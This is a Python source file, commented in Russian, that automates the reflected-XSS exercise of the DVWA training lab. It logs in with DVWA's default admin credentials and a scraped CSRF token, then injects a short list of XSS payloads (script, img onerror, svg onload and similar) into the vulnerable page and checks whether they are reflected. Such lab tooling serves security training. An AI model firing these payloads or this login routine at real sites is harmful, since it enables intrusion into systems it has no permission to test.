from utils.requester import Requester
from utils.logger import get_logger
import re

logger = get_logger(__name__)

class DVWAXSSSolver:
    """
    Решение XSS в DVWA (Reflected)
    """
    
    def __init__(self, lab_url):
        self.lab_url = lab_url.rstrip('/')
        self.requester = Requester()
        
    def solve(self):
        logger.info(f"[+] Solving DVWA XSS lab: {self.lab_url}")
        
        # Логинимся в DVWA
        if not self._login():
            logger.error("[-] Login failed, cannot proceed")
            return False
        
        # Проверяем, что мы действительно залогинены
        if not self._check_logged_in():
            logger.error("[-] Not logged in, check credentials")
            return False
        
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "';alert(1);'",
        ]
        
        for payload in payloads:
            logger.info(f"[*] Trying payload: {payload[:40]}...")
            response = self.requester.get(
                f"{self.lab_url}/vulnerabilities/xss_r/",
                params={"name": payload}
            )
            
            if response and payload in response.text:
                logger.info(f"[+] XSS works! Payload reflected")
                return True
        
        logger.warning("[-] No XSS vulnerability found")
        return False
    
    def _login(self):
        """Логинимся в DVWA с получением и использованием CSRF-токена"""
        logger.info("[*] Logging into DVWA with CSRF token...")
        
        # Шаг 1: Получаем страницу логина и вытаскиваем CSRF-токен
        login_page = self.requester.get(f"{self.lab_url}/login.php")
        
        if not login_page:
            logger.error("[-] Cannot fetch login page")
            return False
        
        # Ищем CSRF-токен в HTML
        token_match = re.search(r'name="user_token"\s+value="([^"]+)"', login_page.text)
        if not token_match:
            logger.warning("[-] No CSRF token found, trying simple login...")
            return self._simple_login()
        
        csrf_token = token_match.group(1)
        logger.info(f"[+] Got CSRF token: {csrf_token}")
        
        # Шаг 2: Отправляем логин с токеном (используя ТУ ЖЕ сессию)
        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": csrf_token
        }
        
        response = self.requester.post(
            f"{self.lab_url}/login.php",
            data=login_data
        )
        
        if response:
            # Проверяем успешность входа
            if "CSRF token is incorrect" not in response.text and "Login failed" not in response.text:
                logger.info("[+] Login successful!")
                return True
            else:
                logger.warning("[-] Login failed - CSRF token may be expired")
                # Пробуем ещё раз с новым токеном
                return self._login_retry()
        
        return False
    
    def _login_retry(self):
        """Повторная попытка логина с обновлённым токеном"""
        logger.info("[*] Retrying login with fresh token...")
        
        # Получаем свежий токен
        login_page = self.requester.get(f"{self.lab_url}/login.php")
        token_match = re.search(r'name="user_token"\s+value="([^"]+)"', login_page.text)
        
        if not token_match:
            return False
        
        csrf_token = token_match.group(1)
        logger.info(f"[+] Got fresh token: {csrf_token}")
        
        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": csrf_token
        }
        
        response = self.requester.post(
            f"{self.lab_url}/login.php",
            data=login_data
        )
        
        if response and "CSRF token is incorrect" not in response.text:
            logger.info("[+] Second login attempt successful!")
            return True
        
        return False
    
    def _simple_login(self):
        """Простой логин без CSRF (для старых версий DVWA)"""
        logger.info("[*] Trying simple login (no CSRF)...")
        
        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login"
        }
        
        response = self.requester.post(
            f"{self.lab_url}/login.php",
            data=login_data
        )
        
        if response and "Login" not in response.text:
            logger.info("[+] Simple login successful")
            return True
        
        return False
    
    def _check_logged_in(self):
        """Проверяет, что мы залогинены"""
        logger.info("[*] Checking login status...")
        
        # Пробуем зайти на защищённую страницу
        response = self.requester.get(f"{self.lab_url}/index.php")
        
        if response and "Login" not in response.text:
            logger.info("[+] Session is active")
            return True
        
        # Проверка через security.php
        response = self.requester.get(f"{self.lab_url}/security.php")
        if response and "Security Level" in response.text:
            logger.info("[+] Session is active (security page accessible)")
            return True
            
        logger.warning("[-] Session not active - still on login page")
        return False
